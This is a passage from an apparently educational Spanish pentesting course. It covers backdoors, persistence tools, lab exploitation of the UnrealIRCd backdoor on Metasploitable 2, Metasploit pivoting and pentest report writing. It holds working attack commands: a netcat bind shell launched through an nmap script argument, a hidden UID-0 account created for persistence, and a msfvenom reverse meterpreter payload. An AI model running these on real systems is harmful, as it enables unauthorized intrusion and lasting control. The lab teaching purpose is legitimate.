| https://pentestlab.blog/2019/11/13/persistence-accessibility-features/ | https://attack.mitre.org/techniques/T1015/ | SI |
| https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/ | https://attack.mitre.org/techniques/T1023/ | NO |
| https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/ | https://attack.mitre.org/techniques/T1031/ | SI |
| https://pentestlab.blog/2020/03/04/persistence-dll-hijacking/ | https://attack.mitre.org/techniques/T1038/ | SI |
| https://pentestlab.blog/2020/01/06/persistence-change-default-file-association/ | https://attack.mitre.org/techniques/T1042/ | NO |
| https://pentestlab.blog/2019/10/07/persistence-new-service/ | https://attack.mitre.org/techniques/T1050/ | SI |
| https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/ | https://attack.mitre.org/techniques/T1053/ | NO |
| https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/ | https://attack.mitre.org/techniques/T1058/ | NO |
| https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/ | https://attack.mitre.org/techniques/T1060/ | NO |
| https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ | https://attack.mitre.org/techniques/T1084/ | SI |
| https://pentestlab.blog/2019/10/21/persistence-security-support-provider/ | https://attack.mitre.org/techniques/T1101/ | SI |
| https://pentestlab.blog/2020/01/07/persistence-appinit-dlls/ | https://attack.mitre.org/techniques/T1103/ | SI |
| https://pentestlab.blog/2020/05/20/persistence-com-hijacking/ | https://attack.mitre.org/techniques/T1122/ | NO |
| https://pentestlab.blog/2019/10/29/persistence-netsh-helper-dll/ | https://attack.mitre.org/techniques/T1128/ | SI |
| https://pentestlab.blog/2019/12/11/persistence-office-application-startup/ | https://attack.mitre.org/techniques/T1137/ | NO |
| https://pentestlab.blog/2019/12/16/persistence-application-shimming/ | https://attack.mitre.org/techniques/T1138/ | SI |
| https://pentestlab.blog/2019/10/09/persistence-screensaver/ | https://attack.mitre.org/techniques/T1180/ | NO |
| https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/ | https://attack.mitre.org/techniques/T1183/ | SI |
| https://pentestlab.blog/2019/10/30/persistence-bits-jobs/ | https://attack.mitre.org/techniques/T1197/ | NO |
| https://pentestlab.blog/2019/10/22/persistence-time-providers/ | https://attack.mitre.org/techniques/T1209/ | SI |
| https://pentestlab.blog/2019/11/05/persistence-powershell-profile/ | https://attack.mitre.org/techniques/T1504/ | NO |
| https://pentestlab.blog/2020/02/04/persistence-waitfor/ | https://pentestlab.blog/methodologies/red-teaming/persistence/ | SI |
| https://pentestlab.blog/2020/02/12/persistence-rid-hijacking/ | https://pentestlab.blog/methodologies/red-teaming/persistence/ | SI |

# **Uso de backdoors y herramientas de persistencia**

El uso de backdoors y herramientas de persistencia es una técnica común en pruebas de penetración, pero es esencial comprender que estas acciones deben llevarse a cabo de manera ética y legal, con el consentimiento explícito del propietario del sistema. Aquí se describen algunas técnicas comunes relacionadas con backdoors y persistencia:

Los backdoors son mecanismos ocultos que permiten el acceso no autorizado al sistema incluso después de que se hayan corregido las vulnerabilidades iniciales. 

### Técnicas:

> Inyección de Código: Insertar código malicioso en aplicaciones o scripts existentes para crear una puerta trasera.

> Creación de Cuentas de Usuario Adicionales: Crear cuentas de usuario adicionales con privilegios elevados para garantizar el acceso persistente.

### Herramientas de Persistencia:

Estas herramientas se utilizan para mantener el acceso continuo al sistema, automatizando la ejecución de comandos o acciones específicas. Ejemplos de Herramientas:

> PowerShell Empire: Permite la creación de agentes persistentes y automatiza la ejecución de comandos.
 
> Covenant: Similar a PowerShell Empire, proporciona una plataforma para la creación de backdoors y la automatización de acciones.

### Consideraciones Importantes:

- Requisito: Obtener el consentimiento explícito del propietario del sistema antes de utilizar backdoors o herramientas de persistencia.
- Uso Responsable: Limitar el uso de backdoors y herramientas de persistencia a lo estrictamente necesario para los fines de la prueba de penetración.
- Documentación Detallada: Documentar meticulosamente la creación y el uso de backdoors, así como las herramientas de persistencia empleadas.
- Seguimiento Transparente: Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas, incluyendo la implementación de backdoors y herramientas de persistencia.
- Eliminación Responsable: Eliminar todas las backdoors y herramientas de persistencia al finalizar las pruebas de penetración, asegurándose de no dejar puntos de acceso no autorizados.
- Evitar Daño No Autorizado: Evitar causar daño no autorizado al sistema, los datos o la integridad del entorno durante la utilización de backdoors y herramientas de persistencia.
- Es crucial recordar que la implementación de backdoors y herramientas de persistencia debe realizarse con el único propósito de mejorar la seguridad del sistema y ayudar en la mitigación de vulnerabilidades. La conducta ética y la transparencia son fundamentales en todas las etapas de las pruebas de penetración.

## **Backdoors deUnrealIRCd y persistencia en Metasploitable 2**

UnrealIRCd es un servidor IRC Open Source. En el mes de noviembre del año 2009 el archivo de nombre “Unreal3.2.8.1.tar.gz” fue reemplazado por una versión conteniendo una puerta trasera (troyano). Esta puerta trasera permitía a cualquier persona ejecutar diversos comandos con los privilegios del usuario ejecutando ircd. La puerta trasera era ejecutada sin importar las restricciones del usuario. Para la siguiente práctica se utilizaremos, como siempre, Metasploitable 2 y Kali Linux.

Centramos la atención en el servicio IRC del puerto TCP 6667.

![IRC](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/irc.png?raw=true)

Utilizaremos el Script NSE de nombre “irc-unrealircd-backdoor.nse” incluida en Nmap, el cual permite verificar si este servidor IRC contiene la puerta trasera.

> nmap -n -Pn -p 6667 --script=irc-unrealircd-backdoor.nse 192.168.1.49

![script-irc](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/script-irc.png?raw=true)

El argumento de nombre "irc-unrealircd-backdoor.command" del script, puede ser utilizado para ejecutar comandos arbitrarios en el sistema remoto. Debido a la naturaleza de esta vulnerabilidad (El resultado nunca es devuelto) no se tiene manera de obtener la salida del comando.

> nmap -n -Pn -p 6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc -l -p 7777 -e /bin/sh' 192.168.1.49
> 

![backdoor](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/backdoor.png?raw=true)

Desde otra terminal se utiliza la herramienta netcat para establecer una conexión hacia el puerto TCP 7777.

# nc -n -vv 192.168.1.49 7777

![nc](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nc.png?raw=true)

> Uname -a

La conexión se ha establecido correctamente. Y ya se tiene acceso en el objetivo de evaluación con los privilegios del usuario root. Completando el punto anterior podemos crear un user root para mantener nuestra persistencia.

> useradd -o --uid 0 superroot

![useradd](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/useradd.png?raw=true)

Herramientas para actividades

Para mantener el acceso, incluso después de reinicios y cierres, se necesita establecer una forma de persistencia. Estas herramientas pueden ayudar:

- **SharPyShell** – Un shell obfuscado y altamente personalizable que es útil para mantener la persistencia.
- **SharpStay** – Esta herramienta permite la persistencia a través de la creación de tareas programadas.
- **SharpEventPersist** – Un script que se utiliza para la persistencia a través de la suscripción a eventos de Windows.
- PowerShell Empire: Permite la creación de agentes persistentes y automatiza la ejecución de comandos.
- Covenant: Similar a PowerShell Empire, proporciona una plataforma para la creación de backdoors y la automatización de acciones.
- Veil-Evasion es una herramienta que crea payloads ofuscados para eludir la detección de antivirus y puede utilizarse para establecer persistencia.
- Beacon (Cobalt Strike): Beacon es una herramienta integrada en Cobalt Strike que permite a los actores de amenazas mantener el acceso persistente y controlar sistemas comprometidos.
- Meterpreter (Metasploit): Meterpreter, un módulo de Metasploit, proporciona funcionalidades avanzadas para el acceso y control persistente en sistemas comprometidos.

Responder es una herramienta que puede ser utilizada para realizar ataques de tipo "LLMNR/NBT-NS Spoofing" y obtener credenciales, lo que puede contribuir a la persistencia.

Recuerda que el conocimiento y uso de estas herramientas deben alinearse con prácticas éticas y legales, y solo deben ser empleadas en entornos controlados con permisos adecuados.

# **Recopilación de información adicional y movimiento lateral**

La recopilación de información adicional y el movimiento lateral son fases fundamentales en las pruebas de penetración, pero es esencial realizarlas de manera ética y legal, con el consentimiento explícito del propietario del sistema.

- Enumeración de Red: Utilizar herramientas como Nmap o Nessus para escanear y enumerar activos en la red.
- Reconocimiento Activo: Utilizar herramientas como DNSenum para recopilar información sobre el dominio y sus subdominios.
- Búsqueda de Información en Fuentes Públicas: Investigar fuentes públicas, como redes sociales y sitios web, para recopilar información sobre empleados y la infraestructura.

## **Movimiento Lateral:**

Desplazarse lateralmente a través de la red, moviéndose de un sistema comprometido a otro, buscando oportunidades de escalada de privilegios.

- Uso de Credenciales Robadas: Utilizar credenciales robadas para autenticarse en otros sistemas y ampliar el alcance del acceso.
- Ataques de Pas-the-Ticket (PtT) o Pas-the-Hash (PtH): Utilizar tickets de Kerberos o hashes de contraseñas para autenticarse en otros sistemas sin conocer la contraseña real.
- Ataques a Protocolos débiles: Explotar debilidades en protocolos como SMB para movimientos laterales.

## **Pivoting en Metasploit**

El pivoting: el proceso de acceder a redes a las que no tenemos acceso en circunstancias normales mediante el uso de computadoras comprometidas. Como punto de partida necesitaremos tener acceso a una máquina comprometida en la red objetivo, dependiendo de la configuración del equipo de la víctima, es posible que necesitemos o no tener root o privilegios de administrador.

![Pivoting](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/pivoting.png?raw=true)

En las primeras fases de escaneo de un pentesting debemos intentar recopilar la mayor cantidad de información posible sobre las redes internas disponibles en la empresa. Muchas organizaciones dividen sus departamentos en segmentos de red o redes locales virtuales (VLANs), donde se alojan determinadas máquinas, en muchos casos los equipos que forman parte de una red tienen configuradas varias interfaces ya sean físicas o lógicas hacia estas otras redes. En este tipo de circunstancias podemos aprovecharnos de esto para pivotar entre equipos de distintas redes y poder encontrar uno o varios equipos ya sean clientes o servidores con posibles vulnerabilidades explotables.

Para poner en práctica estas técnicas realizaremos un taller completo en el que mostraremos dos escenarios muy similares: lab 1 y lab 2, con el fin de que se vea el concepto de pivoting entre máquinas que formen parte de otras redes distintas en las que desde un principio no tendríamos una visibilidad directa hacia ellas desde la máquina en la que realizamos la auditoría del test de intrusión. El nivel de pivoting de estos escenarios será simple, de un solo salto, entre una máquina comprometida a otra. Dependiendo la topología de red de la organización se podría complicar más, con más saltos entre máquinas para ir descubriendo las posibles redes internas existentes, pero la finalidad, el concepto y las técnicas de pivoting seguirían siendo las mismas.

En el siguiente escenario se mostrará un entorno formado por tres máquinas:

- Kali: 10.0.0.1/24. (Máquina A)
- Ubuntu: 10.0.0.10/24 y 11.0.0.1/24. (Máquina B)
- Linux (Apache http): 11.0.0.10/24. (Máquina C)

![Maquinas](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquinas.png?raw=true)

Desde VirtualBox la configuración de las redes es así:

Creamos una NAT desde herramientas.

![nat](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nat.png?raw=true)

Kali tiene un adaptador puente

![kali-adaptador](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-adaptador.png?raw=true)

Linux tiene una NAT

![linux-nat](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/linux-nat.png?raw=true)

Ubuntu tiene:

> Adaptador 1: Adaptador puente

> Adaptador 2: Red Nat

La máquina Kali con Metasploit Framework será desde donde realizaremos la intrusión. Tiene dos interfaces de red, una en modo NAT (eth1 simplemente para tener salida a Internet) y eth0 con la IP asignada 10.0.0.1 que forma parte de la red 10.0.0.0/24. Esta máquina no tiene visibilidad directa con la segunda red 11.0.0.0/24.

![kali-metasploit](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-metasploit.png?raw=true)

La máquina Ubuntu tiene dos interfaces la cual tiene visibilidad con la red 10.0.0.0/24 y 11.0.0.0/24 será el pivoting y la segunda máquina Linux con una sola interface con la ip asignada 11.0.0.10 que tendrá visibilidad para la red 11.0.0.0.0/24, esta será una posible máquina vulnerable ya que dispondrá de un servicio web Apache a la que tendremos que intentar llegar desde la máquina Kali.

![ubuntu](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ubuntu.png?raw=true)

## **Establecer una sesión Meterpreter en la máquina Ubuntu (pivoting)**

El funcionamiento de los tipos de pivoting dentro de las posibilidades que nos ofrece Metasploit Framework debemos partir de la obtención de una sesión Meterpreter en uno de los equipos de la red, en este caso será el Ubuntu en el cual tiene visibilidad con las dos redes dentro de este laboratorio, esta será la máquina que nos hará de pivoting a las redes que tenga configuradas. Para este escenario podemos generar con msfvenom un payload en el que su shellcode será un meterpreter linux y ejecutarlo en la máquina remota para obtener dicha sesión.

> msfvenom -p Linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o payload

- *b '\x00\x0a\x0d'*: (--bad-chars) Parámetro en el que se le puede especificar una lista de caracteres a evitar, de modo que no provoque un posible error en el momento de ejecutar el payload. En este caso estos *[opcodes](https://en.wikipedia.org/wiki/Opcode)* serían válidos.

![opcodes](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/opcodes.png?raw=true)

## **Route**

Una vez tenemos una sesión establecida con la máquina Ubuntu, iniciamos el meterpreter y una forma de comprobar las redes asociadas es listar las interfaces de red con *ipconfig* para comprobar si existe alguna dirección IP asignada que forme parte de otro segmento de red distinto. También podríamos ejecutar una *shell* dentro de meterpreter y consultar la tabla de rutas con el comando *route print*. Como vemos se muestra la red 10.0.0.0/24 en la interface 2 y la 11.0.0.0/24 en la interface 3.

![route](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/route.png?raw=true)

***Route*** es un comando que nos permitirá encaminar tráfico de red dentro de Metasploit, diciéndole que desde cualquier módulo todo el tráfico que queramos llevar hacia otra red lo haga a través del identificador de una sesión establecida que tengamos activa, por ejemplo con un Meterpreter.

Salimos de la sesión de meterpreter y la dejamos en segundo plano saliendo con el comando *background*. Fuera de meterpreter y sabiendo que la máquina Ubuntu tiene dos redes configuradas, hacemos uso del comando route para añadir la visibilidad de esta nueva red a nivel de Metasploit.

> route add <network> <netmask> <session_id>

> route add 11.0.0.0 255.255.255.0 1

Con esto le estaremos diciendo que todo el tráfico que se produzca dentro de Metasploit con destino a la red 11.0.0.0/24 lo enrute a través de la sesión con ID 1 donde está el meterpreter. Con *route print* dentro de Metasploit podemos ver las rutas asignadas y con *route -h* veremos la ayuda completa.

![meterpreter](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/meterpreter.png?raw=true)

De esta forma ya podremos pivotar a través de la máquina Ubuntu a la red 11.0.0.0/24 realizando un escaneo completo hacia esa red.

En el siguiente ejemplo y para ahorrar tiempo en esta demo delimitaremos un pool de direcciones IP de la red 11.0.0.0/24 comprobando únicamente el puerto 80. Vemos que encontramos una dirección 10.0.0.10 que tiene el puerto 80 abierto.

En un descubrimiento habitual podríamos usar el módulo *"auxiliary/scanner/discovery/arp_sweep"* para encontrar hosts activos en la red local a través de solicitudes arp y también *"auxiliary/scanner/portscan/ack"* para comprobar que puertos se están filtrado.

![arp_sweep](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/arp_sweep.png?raw=true)

Con lo anterior ya se demostró que podemos realizar un sondeo y tener acceso a redes pivotando a través de la máquina Ubuntu donde tenemos la sesión meterpreter hacia una máquina Linux con la ip 11.0.0.10.

Ya hemos descubierto que el puerto 80 está abierto por lo que es probable que se trate de un servicio web, podemos ahora comprobar la versión de ese servicio http a través del módulo "*auxiliary/scanner/http/http_version*". A partir de ahí podríamos buscar en Internet si existe alguna vulnerabilidad conocida y explotable para versión y continuar el test de intrusión.

![http_version](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/http_version.png?raw=true)

## **Autoroute (Módulo post)**

Otra forma de establecer rutas es hacerlo de forma automática. Una vez que tenemos una sesión establecida podemos hacer uso del módulo "*post/multi/manage/autoroute*", establecemos el ID de sesión y lo ejecutamos.

Esto hará un barrido en el equipo donde tenemos establecida la sesión para intentar reconocer otras redes asociadas a esa máquina y las agregará automáticamente a nuestra tabla de rutas de Metasploit. Es lo mismo que lo comentado anteriormente pero de forma automática sin necesidad de consultar manualmente a través de meterpreter las tablas de rutas asociadas a la máquina comprometida.

![rutas asociadas](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/rutas-asociadas.png?raw=true)

## **portfwd (Port Forwarding)**

**portfwd** realiza un reenvío de puertos *-port forwarding-* entre máquinas. Podemos canalizar todo el tráfico que enviamos a un puerto local a la escucha de nuestra máquina A a un puerto e IP de una máquina C en la que no tenemos a priori conectividad, configurando esta IP y puerto de reenvío en una máquina B en la que si tenemos una conectividad directa.

Una ventaja de esto es que todas las peticiones que hagamos al puerto local de la máquina A esta las reenviará a la máquina C pasando por la máquina B, si analizamos el tráfico desde la máquina C veremos que esas peticiones llegan desde la máquina B y no desde la máquina A que inicialmente origina las peticiones. Como esto en un primer momento puede resultar un poco confuso mostraremos un ejemplo.

Basándonos en el mismo escenario visito hasta ahora lab 1. Desde la máquina Kali (máquina A) nos intentamos conectar a la máquina Linux al puerto 22 (máquina C), que sabemos que está abierto, y vemos que no podemos conectarnos directamente ya que desde la máquina Kali no tenemos visibilidad hacia la red 11.0.0.0/24.

Sin embargo desde la sesión 1 donde tenemos nuestro meterpreter de la máquina Ubuntu (máquina B) esta si tiene visibilidad con la red 11.0.0.0/24 donde está máquina Linux (máquina C). Desde el meterpreter de la sesión 1 agregamos una nueva regla de reenvío de puertos.

> portfwd add -l <local_port> -p <remote_port> -r <remote_host>

> portfwd add -l 9500 -p 22 -r 11.0.0.10

Con esto indicamos que todas las peticiones que hagamos al puerto local de la máquina A Kali sen reenviadas al puerto 22 de la ip 11.0.0.10 que será la máquina C Linux. Siendo la máquina B Ubuntu quien haga el reenvío de puertos entre la máquina A y C. De ahí que todo el tráfico que llegue a la máquina C Linux es como si lo realizase la máquina B Ubuntu cuando en realidad lo envía la máquina A Kali.

Comprobando nuevamente el intento de conexión vemos como ahora **desde Metasploit Framework como desde la propia máquina local Kali** podemos llegar a la máquina C Linux estableciendo una conexión localhost hacia le puerto local a la escucha.

Si listamos los puertos a la escucha de la máquina local vemos como fuera del MSF tenemos el puerto 9500 a la escucha. Esto puede ser útil en los casos en los que necesitemos utilizar servicios web u otras herramientas fuera de Metasploit para poder escanear, vulnerar o realizar acciones hacia una máquina remota en la que no tendríamos un acceso directo pero si conocemos su IP y puerto y tenemos una máquina que usaremos de pivoting en medio de la comunicación para realizar los reenvíos de puertos. Tener en cuenta que podemos agregar más de una regla port forwarding.

![local Kali](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/local-kali.png?raw=true)

La forma de usar módulos dentro de Metasploit con reglas configuradas de reenvío de puertos es solamente por medio de conexiones locales (ip y puerto local). En el siguiente ejemplo se muestran dos reglas port forwarding establecidas en la sesión 1 (máquina B Ubuntu), la segunda regla indica que las peticiones que se realicen hacia el puerto 9000 desde cualquier interface de la máquina Kali A se reenvíen a través de la sesión 2 (máquina B Ubuntu) hacia la IP destino 11.0.0.10 puerto 80 que será la máquina C Linux.

***RHOST***: será la dirección local de la máquina A Kali, ip 127.0.0.1 (y no la ip 11.0.0.10 de la máquina destino C Linux).

***PORTS***: será el puerto local a la escucha en la máquina A Kali, puerto 9000 (y no el puerto 80 de la máquina destino C Linux).

Vemos como nos indica que el puerto 9000 de la ip 127.0.0.1 está Open. Esto significa que la regla de reenvío funcionó y que realmente esa IP/Puerto local corresponderían a la IP/Puerto destino configurado en la regla del portfwd. Fuera de Metasploit podemos consultar los puertos a la escucha con netstat y comprobar que tanto el puerto 9500, visto en el ejemplo anterior, como el puerto 9000 están a la escucha por un proceso ruby que sería Metasploit.

![portfwd](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/portfwd.png?raw=true)

## **¿Diferencias entre route y portfwd en Metasploit?**

**Route y Autoroute**

- Es necesario tener una sesión establecida.
- Agrega direcciones de red completas indicando su notación CIDR.
- Las tablas de rutas solo se agregan a nivel funcional de Metasploit Framework.
- Dentro de Metasploit se pueden usar todos los módulos de forma directa hacia las redes agregadas.
- Con el módulo post Autorute se pueden descubrir y agregar rutas de red de forma automática de una sesión previamente establecida.

**Portfwd**

- Es necesario tener una sesión establecida.
- No pueden agregar direcciones completas de red, solo se crean reglas de port forwarding hacía una IP/Puerto específico.
- Se pueden usar otras herramientas fuera de Metasploit a nivel local de la propia máquina Kali IP/Puerto locales estarán a la escucha.
- Dentro de Metasploit se pueden usar módulos hacia la IP/Puerto de la regla creada, la IP/Puerto será interpretado de forma local desde la propia máquina Kali.

# 7. Reporte de resultados:

# **Documentación de las actividades realizadas durante el pentesting**

La documentación es una parte crucial del proceso de pentesting y contribuye a la transparencia, claridad y seguimiento del trabajo realizado. Aquí hay una descripción de cómo se documentan las actividades durante el pentesting:

- Informe de Alcance: Detalla los objetivos, limitaciones, y el alcance del pentesting. Define claramente lo que está permitido y lo que no.
- Reconocimiento: Incluye resultados de escaneo de información pública, WHOIS, DNS, y cualquier otro método utilizado para recopilar información sobre el objetivo.
- Escaneo de Vulnerabilidades: Lista de vulnerabilidades encontradas utilizando herramientas de escaneo automatizado.
- Exploits Utilizados: Detalle de exploits empleados y cómo se llevaron a cabo, incluyendo cualquier ajuste o personalización necesaria.
- Resultados de Pruebas de Penetración: Documenta las pruebas manuales realizadas, incluyendo la explotación de vulnerabilidades y el acceso a sistemas.
- Registro de Actividades del Sistema: Detalles de las acciones realizadas en los sistemas objetivo. Incluye comandos ejecutados, cambios realizados, y cualquier actividad relevante.
- Capturas de Pantalla y Evidencia: Imágenes que respaldan los resultados y demuestran la explotación exitosa o la identificación de vulnerabilidades.
- Recopilación de Datos: Detalles sobre cualquier información confidencial o sensible recopilada durante el pentesting.
- Recomendaciones de Mitigación: Propuestas para abordar y corregir las vulnerabilidades encontradas. Incluye pasos específicos y mejores prácticas.
- Conclusiones y Resumen Ejecutivo: Un resumen general de las actividades, hallazgos clave, y una evaluación del riesgo. Dirigido a un público no técnico.
- Firmas y Autorizaciones: Incluye firmas del equipo de seguridad y las partes autorizadas que respaldan la validez y el alcance del informe.
- Revisión con el Cliente: Sesión para revisar el informe con el cliente, aclarar dudas y discutir los resultados.

<aside>
👉 La documentación precisa y completa es esencial para garantizar la efectividad y la integridad de las pruebas de penetración, así como para proporcionar a los clientes la información necesaria para mejorar su postura de seguridad.

</aside>

## **Crear un informe de pentesting**

Es una pregunta muy habitual entre profesionales que están empezando a trabajar en pentesting y aunque hay plantillas que se pueden encontrar fácilmente en internet y algunas herramientas los generan automáticamente, como profesionales debemos seguir ciertas normas a la hora de elaborar los documentos que debo entregar a los clientes tras finalizar los trabajos.

## **Nociones básicas**

La elaboración de informes es una de las cuestiones más importantes en cualquier auditoría y en ellos se debe reflejar de forma clara y concisa los descubrimientos y conclusiones a las que has llegado. Cualquier informe normalmente debe incluir como mínimo lo siguiente:

## **Portada:**

La portada del documento suele ser genérica e incluye entre otras cosas, información sobre la empresa, fecha en la que se entrega el documento y detalles básicos.

![portada](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/portada.png?raw=true)

## **Índice:**

En el índice es común incluir enlaces o accesos directos para que sea fácil moverse por las diferentes secciones del documento. Ejemplo:

### **CONTENIDO**

ALCANCE..........................................................................................................................................................4

HOJA DE REVISION...........................................................................................................................................5

OBJETIVOS y METODOLOGÍA DE TRABAJO......................................................................................................6

Descripción General de Pruebas por Fase de Pentesting................................................................................7

Explotación ......................................................................................................................................................9

Calificación global del riesgo .........................................................................................................................10

NIVEL ALTO - Ausencia de fichas (tokens) Anti-CSRF ....................................................................................11

CONSECUENCIAS........................................................................................................................................12

SOLUCIÓN ..................................................................................................................................................13

EVIDENCIA Y REFERENCIAS ........................................................................................................................14

NIVEL ALTO – Content Security Policy (CSP) Header Not SeT .......................................................................15

CONSECUENCIAS........................................................................................................................................16

SOLUCIÓN ..................................................................................................................................................17

EVIDENCIA Y REFERENCIAS ........................................................................................................................18

NIVEL ALTO - Missing Anti-clickjacking Header.............................................................................................19

CONSECUENCIAS........................................................................................................................................20

SOLUCIÓN ..................................................................................................................................................21

EVIDENCIA Y REFERENCIAS ........................................................................................................................22

NIVEL MEDIO - Application Error Disclosure .................................................................................................23

CONSECUENCIAS........................................................................................................................................24

SOLUCIÓN ..................................................................................................................................................25

EVIDENCIA Y REFERENCIAS ........................................................................................................................26

NIVEL MEDIO – Cookie No HttpOnly Flag......................................................................................................27

CONSECUENCIAS........................................................................................................................................28

SOLUCIÓN ..................................................................................................................................................29

EVIDENCIA Y REFERENCIAS ........................................................................................................................30

NIVEL MEDIO – Cookie Without Secure Flag.................................................................................................31

CONSECUENCIAS........................................................................................................................................32

SOLUCIÓN ..................................................................................................................................................33

EVIDENCIA Y REFERENCIAS ........................................................................................................................34

NIVEL MEDIO – Cookie Without Secure Flag.................................................................................................35

CONSECUENCIAS........................................................................................................................................36

SOLUCIÓN ..................................................................................................................................................37

EVIDENCIA Y REFERENCIAS ........................................................................................................................38

NIVEL MEDIO - Permissions Policy Header Not Set.......................................................................................39

CONSECUENCIAS........................................................................................................................................40

SOLUCIÓN ..................................................................................................................................................41

EVIDENCIA Y REFERENCIAS ........................................................................................................................42

NIVEL MEDIO - SSL/TLS usa algoritmos hashing y cifrado débiles ................................................................43

CONSECUENCIAS........................................................................................................................................44

SOLUCIÓN ..................................................................................................................................................44

EVIDENCIA Y REFERENCIAS ........................................................................................................................46

NIVEL MEDIO - Strict-Transport-Security Header Not Set.............................................................................47

CONSECUENCIAS........................................................................................................................................48

SOLUCIÓN ..................................................................................................................................................49

EVIDENCIA Y REFERENCIAS ........................................................................................................................50

NIVEL MEDIO - X-Content-Type-Options Header Missing.............................................................................51

CONSECUENCIAS........................................................................................................................................52

SOLUCIÓN ..................................................................................................................................................53

EVIDENCIA Y REFERENCIAS ........................................................................................................................54

NIVEL Info – Información General .................................................................................................................55

NIVEL Info - Búsqueda Inversa de IP..............................................................................................................58

NIVEL Info - Análisis de IP ..............................................................................................................................59

NIVEL Info - Análisis DEL DOMINIO ...............................................................................................................61

NIVEL Info - Análisis DE Puertos ....................................................................................................................62

NIVEL Info - Análisis SSL.................................................................................................................................67

NIVEL Info - Análisis DE Servicios...................................................................................................................70

## **Control de versiones:**

El control de versiones debe incluir como mínimo, una descripción de los cambios introducidos en cada modificación del documento con una fecha y autor. Ejemplo:

### **Hoja de revisión**

![Hoja](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/hoja.png?raw=true)

## **Disclaimer y confidencialidad de la información**

### **Alcance**

El alcance del presente trabajo consistió en la evaluación del riesgo de seguridad y su grado de exposición a través de técnicas de intrusión. Se utilizaron herramientas de seguridad, analizadores de vulnerabilidades y metodologías de recolección de información del mismo modo que serían utilizadas por los atacantes.

Las tareas llevadas a cabo comprenden el reconocimiento activo de sistemas con el fin de evaluar los riesgos potenciales de los mismos. Finalmente se realizó un análisis e intento de intrusión sobre los sistemas activos, con el propósito de hallar las potenciales vulnerabilidades que puedan afectarlos. Los objetivos realizados para el Pentest son la selección del dominio, sistemas, servicios y aplicativos sobre las siguientes direcciones IP y Dominios:

**200.190.180.170: webdelcliente.com**

El cliente contrató a Router ID para llevar a cabo una auditoría externa contra sus sitios y aplicativos webs para proporcionar una demostración práctica de la eficacia de sus sistemas y metodología de seguridad, así como para proporcionar una estimación de su susceptibilidad a la explotación, integridad, exposición o perdida de datos.

La prueba se realizó de acuerdo con el Método de Pruebas de Penetración de Seguridad de la Información de Router ID. El Analista de Seguridad de la Información (ISA) de Router ID llevó a cabo La auditoría en coordinación con los miembros del personal de Tecnología de la Información (TI) del cliente para garantizar pruebas seguras, ordenadas y completas dentro del alcance aprobado.

Contemple la gran importancia de solucionar estas brechas de seguridad que permiten un gran riesgo de violación de cumplimiento y potencialmente sujeto a multas y pérdida de reputación empresarial.

El presente Informe contiene información confidencial, no debe ser enviado vía mail, fax o cualquier otro medio electrónico a menos que este se encuentre específicamente aprobado por las políticas de seguridad de la Compañía. Todas las copias electrónicas o en papel del presente documento deben ser guardadas en un sitio protegido.

No comparta la información contenida en este documento, a menos que la otra persona esté autorizada para ello. router-id.com da permiso para copiar este informe con el fin de difundir información dentro de su organización o cualquier agencia reguladora.

## **Metodologías utilizadas**

### Objetivos y metodologías de trabajo

Este documento detalla la evaluación de seguridad referido al **Pentesting externo**. El objetivo de este trabajo fue identificar las vulnerabilidades dentro del alcance acordado entre las partes, y los riesgos que pueden causar en el negocio de la empresa.

Es tu responsabilidad implementar las recomendaciones que se harán, con el objetivo de aumentar la seguridad en los dominios (desarrollo de aplicaciones, soporte de infraestructura), así como gestionar el nivel de exposición a los riesgos de la organización y la adecuación a las cuestiones regulatorias.

Si no dispones de personal calificado para esta tarea nosotros podemos llevarla a cabo. ***Consulta por nuestro servicio de corrección de fallas de seguridad y hardening.***

**Los Objetivos específicos son:**

- Detectar vulnerabilidades y problemas de seguridad que puedan ser aprovechados por atacantes.
- Evaluar la efectividad y respuesta de los sistemas de seguridad implementados (Firewalls, detección de intrusos y otros sistemas).
- Analizar y determinar el nivel de exposición de la infraestructura tecnológica de los sistemas de acuerdo con las vulnerabilidades detectadas.
- Presentar recomendaciones concretas que permitan corregir los problemas y brechas de seguridad detectados y minimizar los riesgos asociados.

## **Contexto de la auditoría y nociones generales**

### Descripción general de pruebas de fase por pentesting

1. Advanced SQL Injection

2. Análisis de IP

3. Análisis de metadatos

4. Análisis de Puertos

5. Análisis de Servicios

6. Análisis de servicios web

7. Análisis del Dominio

8. Análisis SSL

9. Apache no soportado

10. Application Error Disclosure

11. Archivo robots y sitemap

12. Archivos de backup

13. Ataque al Host Header

14. Ausencia de CAPTCHA

